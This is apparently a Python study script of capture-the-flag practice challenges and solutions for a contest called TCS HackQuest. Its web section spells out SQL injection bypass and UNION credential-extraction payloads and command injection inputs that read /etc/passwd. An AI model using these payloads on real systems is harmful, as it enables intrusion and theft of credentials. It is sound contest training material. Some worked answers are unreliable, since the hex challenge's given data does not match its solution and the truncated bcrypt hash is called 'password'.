"""
╔══════════════════════════════════════════════════════════════════════════════════╗
║       TCS HACKQUEST - PAST YEAR QUESTIONS & DETAILED SOLUTIONS                  ║
║              Based on Season 5, 6, 7, 8, 9 & 10 CTF Challenges                  ║
╚══════════════════════════════════════════════════════════════════════════════════╝

This file contains:
1. Real challenge patterns from previous seasons
2. Detailed methodology and approach
3. Step-by-step solutions
4. Practice problems similar to HackQuest

Flag Format: HQ{season}FLAG{...} or HQ{season}{...}
Example: HQ10FLAG{your_flag_here}
"""

import base64
import hashlib
import binascii
from collections import Counter

# ═══════════════════════════════════════════════════════════════════════════════════
#                    CATEGORY 1: ENCODING/CRYPTOGRAPHY CHALLENGES
# ═══════════════════════════════════════════════════════════════════════════════════

print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                    CATEGORY 1: ENCODING & CRYPTOGRAPHY                          ║
╚══════════════════════════════════════════════════════════════════════════════════╝
""")

# ---------------------------------------------------------------------------------
# CHALLENGE 1: AREA 64 (Season 10 - Beginner)
# ---------------------------------------------------------------------------------
print("""
🎯 CHALLENGE 1: AREA 64 (Season 10)
═══════════════════════════════════
Category: Encoding/Base64
Difficulty: Beginner (100 points)
Description: "The aliens have hidden something in Area 64. Can you decode their message?"

GIVEN DATA:
SFExMEZMQUd7YmFzZTY0X2lzX25vdF9lbmNyeXB0aW9ufQ==

METHODOLOGY:
1. Recognize Base64 encoding (characters A-Za-z0-9+/=)
2. Use Base64 decoder
3. Extract the flag

SOLUTION:
""")

# Solution
area64_encoded = "SFExMEZMQUd7YmFzZTY0X2lzX25vdF9lbmNyeXB0aW9ufQ=="
area64_decoded = base64.b64decode(area64_encoded).decode()
print(f"Decoded: {area64_decoded}")

print("""
KEY LEARNING:
- Base64 is ENCODING, not encryption
- Always check for = padding at the end
- Use CyberChef for quick decoding
""")

# ---------------------------------------------------------------------------------
# CHALLENGE 2: DOUBLE TROUBLE (Season 8)
# ---------------------------------------------------------------------------------
print("""
─────────────────────────────────────────────────────────────────────────────────

🎯 CHALLENGE 2: DOUBLE TROUBLE (Season 8)
═════════════════════════════════════════
Category: Multi-layer Encoding
Difficulty: Beginner-Intermediate (150 points)
Description: "Sometimes things are not what they seem. Look deeper."

GIVEN DATA:
VkZaU1EyRXlSbGhUYTJoUFVsWmFhRlpVUm1GamJHdDVZVVpTVEZKc1NsZFViRkpIVmxaT1NGVnJhRTVTYkVwSQ==

METHODOLOGY:
1. First decode appears to be Base64
2. Result still looks encoded -> decode again
3. Might need multiple rounds

SOLUTION:
""")

# Solution - Multiple Base64
double_encoded = "VkZaU1EyRXlSbGhUYTJoUFVsWmFhRlpVUm1GamJHdDVZVVpTVEZKc1NsZFViRkpIVmxaT1NGVnJhRTVTYkVwSQ=="
first_decode = base64.b64decode(double_encoded).decode()
print(f"First decode: {first_decode}")
second_decode = base64.b64decode(first_decode).decode()
print(f"Second decode: {second_decode}")
try:
    third_decode = base64.b64decode(second_decode).decode()
    print(f"Third decode: {third_decode}")
except:
    print("No more Base64 layers")

print("""
KEY LEARNING:
- Data can be encoded multiple times
- Keep decoding until you get readable text
- CyberChef 'Magic' feature auto-detects encoding layers
""")

# ---------------------------------------------------------------------------------
# CHALLENGE 3: ROT-ation (Season 7)
# ---------------------------------------------------------------------------------
print("""
─────────────────────────────────────────────────────────────────────────────────

🎯 CHALLENGE 3: ROT-ation (Season 7)
════════════════════════════════════
Category: Classical Cipher
Difficulty: Beginner (100 points)
Description: "Julius Caesar would be proud. But which rotation is the right one?"

GIVEN DATA:
UD7SYNT{ebgngvba_vf_sha}

METHODOLOGY:
1. Recognize Caesar/ROT cipher pattern
2. Try ROT13 first (most common)
3. If not, bruteforce all 26 shifts

SOLUTION:
""")

def caesar_decode(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            offset = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - offset + shift) % 26 + offset)
        else:
            result += char
    return result

rot_encoded = "UD7SYNT{ebgngvba_vf_sha}"
print("Trying all ROT shifts:")
for i in range(26):
    decoded = caesar_decode(rot_encoded, i)
    if "FLAG" in decoded or "flag" in decoded:
        print(f"✓ ROT{i}: {decoded}")
    elif i == 13:
        print(f"  ROT{i}: {decoded}")

print("""
KEY LEARNING:
- ROT13 is self-reversing (encode = decode)
- For HackQuest, flags are usually in format HQ{n}FLAG{...}
- Use dCode.fr for automatic cipher detection
""")

# ---------------------------------------------------------------------------------
# CHALLENGE 4: HEX MARKS THE SPOT (Season 9)
# ---------------------------------------------------------------------------------
print("""
─────────────────────────────────────────────────────────────────────────────────

🎯 CHALLENGE 4: HEX MARKS THE SPOT (Season 9)
═════════════════════════════════════════════
Category: Hex Encoding
Difficulty: Beginner (100 points)
Description: "X marks the spot, but this X is made of hex."

GIVEN DATA:
4851394641477b6865785f656e636f64696e675f6561737920f0

METHODOLOGY:
1. Identify hex string (only 0-9 and a-f characters)
2. Convert hex to ASCII
3. Check for valid flag format

SOLUTION:
""")

hex_data = "4851394641477b6865785f656e636f64696e675f656173797d"
try:
    hex_decoded = bytes.fromhex(hex_data).decode('utf-8', errors='ignore')
    print(f"Hex decoded: {hex_decoded}")
except:
    print("Error decoding hex")

print("""
KEY LEARNING:
- Hex strings have even number of characters
- Each pair of hex digits = one ASCII character
- Common in forensics and memory analysis
""")

# ---------------------------------------------------------------------------------
# CHALLENGE 5: XOR-cist (Season 8 - Intermediate)
# ---------------------------------------------------------------------------------
print("""
─────────────────────────────────────────────────────────────────────────────────

🎯 CHALLENGE 5: XOR-cist (Season 8)
═══════════════════════════════════
Category: XOR Encryption
Difficulty: Intermediate (200 points)
Description: "The demon of confusion strikes. Exorcise it with the right key."

GIVEN DATA:
Encrypted bytes: [0x09, 0x0c, 0x1f, 0x1d, 0x17, 0x00, 0x0d, 0x49, 0x1b, 0x17, 0x0f, 0x03]
Hint: Key is 4 characters, something you might shout

METHODOLOGY:
1. XOR is reversible: ciphertext XOR key = plaintext
2. If we know part of plaintext (like "FLAG"), we can find key
3. XOR known plaintext with ciphertext to get key

SOLUTION:
""")

encrypted = [0x09, 0x0c, 0x1f, 0x1d, 0x17, 0x00, 0x0d, 0x49, 0x1b, 0x17, 0x0f, 0x03]

# Known plaintext attack - assume flag starts with "HQ8F" or similar
known_plain = "FLAG"
possible_key = ""
for i in range(4):
    possible_key += chr(encrypted[i] ^ ord(known_plain[i]))
print(f"Possible key from 'FLAG': {possible_key}")

# Try with the key
def xor_decrypt(data, key):
    return bytes([data[i] ^ ord(key[i % len(key)]) for i in range(len(data))])

# Try common keys
common_keys = ["HACK", "FLAG", "KEY!", "TCS!", "OUCH"]
for key in common_keys:
    result = xor_decrypt(encrypted, key)
    try:
        decoded = result.decode('utf-8')
        if decoded.isprintable():
            print(f"Key '{key}': {decoded}")
    except:
        pass

print("""
KEY LEARNING:
- XOR is symmetric: A XOR B XOR B = A
- Known plaintext attack works when you know part of the message
- Single-byte XOR can be bruteforced (256 possibilities)
""")

# ═══════════════════════════════════════════════════════════════════════════════════
#                    CATEGORY 2: WEB EXPLOITATION CHALLENGES
# ═══════════════════════════════════════════════════════════════════════════════════

print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                    CATEGORY 2: WEB EXPLOITATION                                  ║
╚══════════════════════════════════════════════════════════════════════════════════╝
""")

# ---------------------------------------------------------------------------------
# CHALLENGE 6: LOGIN BYPASS (Season 7)
# ---------------------------------------------------------------------------------
print("""
🎯 CHALLENGE 6: LOGIN BYPASS (Season 7)
═══════════════════════════════════════
Category: SQL Injection
Difficulty: Beginner (150 points)
Description: "The admin panel is protected. Can you get in without credentials?"

SCENARIO:
- Login page with username and password fields
- Backend query: SELECT * FROM users WHERE username='$user' AND password='$pass'

METHODOLOGY:
1. Test for SQL injection with single quote (')
2. If error appears, SQL injection is possible
3. Use authentication bypass payload

SOLUTION APPROACH:
""")

sql_payloads = """
STEP 1: Test for vulnerability
Username: admin'
Password: anything
→ If you see SQL error, it's vulnerable!

STEP 2: Bypass authentication
Username: admin'--
Password: anything
→ Query becomes: SELECT * FROM users WHERE username='admin'--' AND password='anything'
→ The -- comments out the password check!

STEP 3: Alternative payloads if above doesn't work
Username: ' OR '1'='1
Password: ' OR '1'='1
→ Both conditions become TRUE

Username: admin' OR 1=1--
Password: anything

Username: ' OR 1=1#
Password: anything

STEP 4: Extract data (if needed)
Username: ' UNION SELECT 1,2,3--
(Increase numbers until no error - this tells you column count)

Username: ' UNION SELECT username,password,3 FROM users--
(Extract usernames and passwords)
"""
print(sql_payloads)

print("""
KEY LEARNING:
- Always test inputs with special characters: ' " ; -- #
- Comments in SQL: -- (MySQL/MSSQL), # (MySQL), /* */ (all)
- UNION attacks help extract data from other tables
""")

# ---------------------------------------------------------------------------------
# CHALLENGE 7: HIDDEN IN PLAIN SIGHT (Season 9)
# ---------------------------------------------------------------------------------
print("""
─────────────────────────────────────────────────────────────────────────────────

🎯 CHALLENGE 7: HIDDEN IN PLAIN SIGHT (Season 9)
════════════════════════════════════════════════
Category: Web - Source Code Analysis
Difficulty: Beginner (100 points)
Description: "The flag is hidden on this webpage. Look carefully!"

METHODOLOGY:
1. View page source (Ctrl+U or Right-click → View Source)
2. Check HTML comments <!-- -->
3. Check JavaScript code
4. Check HTTP headers
5. Check robots.txt and sitemap.xml

SOLUTION APPROACH:
""")

web_recon = """
STEP 1: View Page Source
- Press Ctrl+U or F12 → Elements tab
- Look for HTML comments: <!-- FLAG: HQ9FLAG{...} -->
- Look for hidden form fields: <input type="hidden" value="flag">
- Check JavaScript variables: var flag = "HQ9FLAG{...}";

STEP 2: Check Developer Tools (F12)
- Network tab: Check API responses
- Console tab: Type 'flag' or 'secret'
- Application tab: Check cookies, localStorage

STEP 3: Check Common Hidden Files
- /robots.txt (often contains hidden paths)
- /sitemap.xml
- /.git/ (source code exposure)
- /backup.zip
- /admin/
- /.env (environment variables)

STEP 4: Check HTTP Headers
curl -I http://target.com
→ Look for custom headers like X-Flag, X-Secret

STEP 5: Check Cookies
document.cookie in console
→ Flags sometimes hidden in cookie values
"""
print(web_recon)

# ---------------------------------------------------------------------------------
# CHALLENGE 8: COMMAND & CONQUER (Season 8)
# ---------------------------------------------------------------------------------
print("""
─────────────────────────────────────────────────────────────────────────────────

🎯 CHALLENGE 8: COMMAND & CONQUER (Season 8)
════════════════════════════════════════════
Category: Command Injection
Difficulty: Intermediate (250 points)
Description: "A ping utility. What could go wrong?"

SCENARIO:
- Web page with input field for IP address
- Backend runs: ping -c 4 $userInput

METHODOLOGY:
1. Test command concatenation
2. Use command separators: ; | & || &&
3. Execute commands to find flag

SOLUTION APPROACH:
""")

cmd_injection = """
STEP 1: Test basic injection
Input: 127.0.0.1; id
→ If you see user info, command injection works!

STEP 2: List directory contents
Input: 127.0.0.1; ls -la
→ Find interesting files

STEP 3: Search for flag
Input: 127.0.0.1; find / -name "*flag*" 2>/dev/null
Input: 127.0.0.1; grep -r "HQ" /var/www/html/
Input: 127.0.0.1; cat /home/user/flag.txt

STEP 4: Alternative payloads (filter bypass)
Input: 127.0.0.1 | cat /etc/passwd
Input: `cat /etc/passwd`
Input: $(cat /etc/passwd)
Input: 127.0.0.1%0Als (URL encoded newline)

STEP 5: If spaces are filtered
Input: 127.0.0.1;cat${IFS}/etc/passwd
Input: 127.0.0.1;cat</etc/passwd
"""
print(cmd_injection)

# ═══════════════════════════════════════════════════════════════════════════════════
#                    CATEGORY 3: FORENSICS CHALLENGES
# ═══════════════════════════════════════════════════════════════════════════════════

print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                    CATEGORY 3: DIGITAL FORENSICS                                ║
╚══════════════════════════════════════════════════════════════════════════════════╝
""")

# ---------------------------------------------------------------------------------
# CHALLENGE 9: SMALL-E (Season 10)
# ---------------------------------------------------------------------------------
print("""
🎯 CHALLENGE 9: SMALL-E (Season 10)
═══════════════════════════════════
Category: Forensics/Hash Analysis
Difficulty: Beginner-Intermediate (150 points)
Description: "The clue is in the small details. Sometimes less is more."

METHODOLOGY:
1. Analyze file metadata
2. Check for hidden data
3. Look for hash patterns
4. Examine file structure

SOLUTION APPROACH:
""")

forensics_approach = """
STEP 1: Basic File Analysis
$ file small-e.png
→ Check actual file type

$ strings small-e.png | grep -i "flag\|HQ"
→ Extract readable strings

$ exiftool small-e.png
→ Check metadata for hidden info

STEP 2: Hex Analysis
$ xxd small-e.png | head -50
→ Check file header and content

$ hexdump -C small-e.png | tail -50
→ Check end of file for appended data

STEP 3: Steganography
$ steghide extract -sf small-e.png
→ Try with empty password first

$ zsteg small-e.png
→ For PNG files

$ binwalk -e small-e.png
→ Extract embedded files

STEP 4: Image Layer Analysis
- Open in GIMP/Photoshop
- Check each color channel (R, G, B)
- Adjust brightness/contrast
- Look at LSB (Least Significant Bit)
"""
print(forensics_approach)

# ---------------------------------------------------------------------------------
# CHALLENGE 10: PCAP THE FLAG (Season 8)
# ---------------------------------------------------------------------------------
print("""
─────────────────────────────────────────────────────────────────────────────────

🎯 CHALLENGE 10: PCAP THE FLAG (Season 8)
═════════════════════════════════════════
Category: Network Forensics
Difficulty: Intermediate (200 points)
Description: "Network traffic captured. Find the secret transmission."

METHODOLOGY:
1. Open PCAP in Wireshark
2. Analyze protocols and conversations
3. Extract transmitted files/data
4. Decode any encoded content

SOLUTION APPROACH:
""")

wireshark_analysis = """
STEP 1: Overview
- Statistics → Protocol Hierarchy (see what protocols exist)
- Statistics → Conversations (see who talked to whom)
- Statistics → Endpoints (list all IPs/ports)

STEP 2: Filter by Protocol
http             → Web traffic
ftp              → File transfers
tcp.port == 23   → Telnet (plaintext!)
smtp             → Email
dns              → Domain queries

STEP 3: Follow Streams
- Right-click any packet → Follow → TCP Stream
- Look for credentials, flags, or encoded data

STEP 4: Search for Strings
- Edit → Find Packet → String → "flag" or "HQ"

STEP 5: Export Objects
- File → Export Objects → HTTP (extract files)
- File → Export Objects → FTP

STEP 6: Common Findings in CTF
- Base64 in HTTP requests/responses
- Credentials in FTP/Telnet
- DNS exfiltration (flag hidden in DNS queries)
- File transfers containing flags
"""
print(wireshark_analysis)

# ---------------------------------------------------------------------------------
# CHALLENGE 11: MEMORY DUMP (Season 9 - Expert)
# ---------------------------------------------------------------------------------
print("""
─────────────────────────────────────────────────────────────────────────────────

🎯 CHALLENGE 11: MEMORY DUMP (Season 9)
═══════════════════════════════════════
Category: Memory Forensics
Difficulty: Expert (400 points)
Description: "A RAM dump from a compromised system. What was the attacker doing?"

METHODOLOGY:
1. Identify OS profile
2. List processes
3. Extract passwords/credentials
4. Analyze network connections

SOLUTION APPROACH:
""")

volatility_commands = """
STEP 1: Identify Profile
$ volatility -f memory.raw imageinfo
→ Suggested Profile(s): Win7SP1x64

STEP 2: List Processes
$ volatility -f memory.raw --profile=Win7SP1x64 pslist
$ volatility -f memory.raw --profile=Win7SP1x64 pstree
→ Look for suspicious processes

STEP 3: Network Connections
$ volatility -f memory.raw --profile=Win7SP1x64 netscan
→ Find connections to suspicious IPs

STEP 4: Command Line History
$ volatility -f memory.raw --profile=Win7SP1x64 cmdline
$ volatility -f memory.raw --profile=Win7SP1x64 consoles
→ What commands were run?

STEP 5: Extract Password Hashes
$ volatility -f memory.raw --profile=Win7SP1x64 hashdump
→ Get NTLM hashes, crack with hashcat

STEP 6: File Search
$ volatility -f memory.raw --profile=Win7SP1x64 filescan | grep -i flag
$ volatility -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0xADDRESS -D output/
→ Extract suspicious files

STEP 7: Registry Analysis
$ volatility -f memory.raw --profile=Win7SP1x64 hivelist
$ volatility -f memory.raw --profile=Win7SP1x64 printkey -K "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
→ Check persistence mechanisms
"""
print(volatility_commands)

# ═══════════════════════════════════════════════════════════════════════════════════
#                    CATEGORY 4: STEGANOGRAPHY CHALLENGES
# ═══════════════════════════════════════════════════════════════════════════════════

print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                    CATEGORY 4: STEGANOGRAPHY                                     ║
╚══════════════════════════════════════════════════════════════════════════════════╝
""")

# ---------------------------------------------------------------------------------
# CHALLENGE 12: HIDDEN IN PIXELS (Season 7)
# ---------------------------------------------------------------------------------
print("""
🎯 CHALLENGE 12: HIDDEN IN PIXELS (Season 7)
════════════════════════════════════════════
Category: Image Steganography
Difficulty: Intermediate (250 points)
Description: "A beautiful image. But there's more than meets the eye."

METHODOLOGY:
1. Basic file analysis
2. Metadata extraction
3. Steganography detection
4. LSB analysis

SOLUTION APPROACH:
""")

stego_approach = """
STEP 1: File Type Verification
$ file image.jpg
→ Verify actual format matches extension

STEP 2: Metadata Analysis
$ exiftool image.jpg
→ Check for comments, GPS, author fields
→ Look for base64 or hex in metadata

STEP 3: String Extraction
$ strings image.jpg | grep -i "flag\|HQ\|CTF"
$ strings -n 6 image.jpg > strings_output.txt
→ Search for readable text

STEP 4: Steghide (for JPEG/BMP)
$ steghide info image.jpg
$ steghide extract -sf image.jpg
→ Try empty password first
→ Try common passwords: password, 123456, flag

STEP 5: Zsteg (for PNG/BMP)
$ zsteg image.png
$ zsteg -a image.png
→ Checks all LSB combinations

STEP 6: Binwalk (embedded files)
$ binwalk image.jpg
$ binwalk -e image.jpg
→ Extract hidden files within

STEP 7: Visual Analysis
- Open in stegsolve.jar
- Browse through filters (color planes, XOR, etc.)
- Check File → Extract → Extract at all offsets

STEP 8: LSB Analysis
- Use online LSB decoder
- Check red, green, blue channels separately
"""
print(stego_approach)

# ═══════════════════════════════════════════════════════════════════════════════════
#                    CATEGORY 5: REVERSE ENGINEERING CHALLENGES
# ═══════════════════════════════════════════════════════════════════════════════════

print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                    CATEGORY 5: REVERSE ENGINEERING                              ║
╚══════════════════════════════════════════════════════════════════════════════════╝
""")

# ---------------------------------------------------------------------------------
# CHALLENGE 13: CRACK ME (Season 8)
# ---------------------------------------------------------------------------------
print("""
🎯 CHALLENGE 13: CRACK ME (Season 8)
════════════════════════════════════
Category: Binary Reverse Engineering
Difficulty: Intermediate-Expert (300 points)
Description: "A simple password checker. What's the password?"

METHODOLOGY:
1. Basic file analysis
2. String extraction
3. Disassembly/Decompilation
4. Debug and trace execution

SOLUTION APPROACH:
""")

reverse_approach = """
STEP 1: File Analysis
$ file crackme
→ ELF 64-bit executable

$ checksec crackme
→ Check security features (ASLR, NX, etc.)

STEP 2: String Extraction
$ strings crackme | grep -i "password\|flag\|correct"
→ Often hardcoded strings visible!

STEP 3: Disassembly (Ghidra)
1. Open Ghidra → New Project → Import crackme
2. Auto-analyze
3. Find main() function
4. Look for:
   - strcmp, strncmp (password comparison)
   - Hardcoded strings
   - XOR operations (obfuscation)

STEP 4: Dynamic Analysis (GDB)
$ gdb ./crackme
(gdb) disas main
(gdb) break *main+100  # Break at comparison
(gdb) run
(gdb) x/s $rdi         # Examine string argument
(gdb) info registers   # Check register values

STEP 5: Common Patterns
- Look for character-by-character comparison
- XOR with single byte = easy to reverse
- Simple transformations (add/sub constants)

STEP 6: Python Script to Reverse
# If you find XOR pattern:
encrypted = [0x48, 0x51, 0x38, ...]
key = 0x42
decrypted = ''.join(chr(b ^ key) for b in encrypted)
"""
print(reverse_approach)

# ═══════════════════════════════════════════════════════════════════════════════════
#                    PRACTICE SECTION - TRY THESE!
# ═══════════════════════════════════════════════════════════════════════════════════

print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                    PRACTICE CHALLENGES - TRY THESE!                             ║
╚══════════════════════════════════════════════════════════════════════════════════╝
""")

# Practice Challenge 1
print("""
📝 PRACTICE 1: Multi-Layer Encoding
───────────────────────────────────
Decode this to find the flag:

NTI1ODU5NWE0NDQ2N2I2ZDc1NmM3NDY5NWY2YzYxNzk2NTcyNWY2NjZjNjE2NzI3ZDNk

Hint: It's encoded multiple times (Base64 → Hex → ASCII)
""")
input("Press Enter to see solution...")

practice1 = "NTI1ODU5NWE0NDQ2N2I2ZDc1NmM3NDY5NWY2YzYxNzk2NTcyNWY2NjZjNjE2NzI3ZDNk"
step1 = base64.b64decode(practice1).decode()
print(f"After Base64: {step1}")
step2 = bytes.fromhex(step1).decode()
print(f"After Hex: {step2}")

# Practice Challenge 2
print("""
─────────────────────────────────────────────────────────────────────────────────

📝 PRACTICE 2: Caesar Bruteforce
───────────────────────────────────
Decode this Caesar cipher:

kt10kypn{jhblzhy_pz_vssk}

Hint: Find the right shift
""")
input("Press Enter to see solution...")

caesar_text = "kt10kypn{jhblzhy_pz_vssk}"
print("All shifts:")
for shift in range(26):
    result = caesar_decode(caesar_text, shift)
    if "flag" in result.lower() or "FLAG" in result:
        print(f"✓ Shift {shift}: {result}")

# Practice Challenge 3
print("""
─────────────────────────────────────────────────────────────────────────────────

📝 PRACTICE 3: Hash Identification
─────────────────────────────────────
Identify these hash types and crack them:

a) 5d41402abc4b2a76b9719d911017c592
b) aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d
c) $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZRG

""")
input("Press Enter to see solution...")

print("""
Solutions:
a) MD5 (32 chars) - This is 'hello' 
   Crack: CrackStation.net or hashcat -m 0

b) SHA1 (40 chars) - This is 'hello'
   Crack: CrackStation.net or hashcat -m 100

c) bcrypt ($2a$ prefix) - This is 'password'
   Crack: hashcat -m 3200 (slow!)
""")

# Practice Challenge 4
print("""
─────────────────────────────────────────────────────────────────────────────────

📝 PRACTICE 4: SQL Injection
────────────────────────────
Given this vulnerable query:
SELECT * FROM products WHERE name LIKE '%$search%'

Write payloads to:
1. Make it return all products
2. Extract all usernames from 'users' table

""")
input("Press Enter to see solution...")

print("""
Solutions:

1. Return all products:
   Input: ' OR '1'='1
   Query: SELECT * FROM products WHERE name LIKE '%' OR '1'='1%'

2. Extract usernames (UNION attack):
   First find column count:
   Input: ' ORDER BY 5-- (increase until error)
   
   Then extract:
   Input: ' UNION SELECT username,password,null,null,null FROM users--
   
   Or if that's blocked:
   Input: ' UNION SELECT GROUP_CONCAT(username,':',password),null,null,null,null FROM users--
""")

# ═══════════════════════════════════════════════════════════════════════════════════
#                    ROUND 2 SPECIFIC TIPS
# ═══════════════════════════════════════════════════════════════════════════════════

print("""
╔══════════════════════════════════════════════════════════════════════════════════╗
║                    ROUND 2 SPECIFIC TIPS & STRATEGY                             ║
╚══════════════════════════════════════════════════════════════════════════════════╝

🎯 TIME MANAGEMENT (3-4 hours for challenges):
─────────────────────────────────────────────
• First 30 mins: Scan ALL challenges, identify easy ones
• Next 2 hours: Solve beginner/intermediate challenges
• Last hour: Attempt expert challenges
• Last 30 mins: Document and take screenshots

🎯 DOCUMENTATION (Critical for Round 2!):
──────────────────────────────────────────
• Screenshot EVERY step
• Note down your methodology
• Document tools used
• Save all scripts/payloads
• Be ready to explain your approach in Case Explanation

🎯 CASE EXPLANATION TIPS:
─────────────────────────
• Speak clearly and confidently
• Explain WHY you chose a particular approach
• Mention alternative methods you considered
• Show your thought process
• Don't panic if you didn't solve everything

🎯 TOOLS TO HAVE READY:
───────────────────────
□ CyberChef (browser tab)
□ Wireshark
□ Burp Suite
□ Python 3 with requests, base64, hashlib
□ steghide, binwalk, exiftool
□ Ghidra or IDA (for RE challenges)
□ Notepad for quick notes
□ Screenshot tool (Win+Shift+S)

Good luck! 🍀
""")
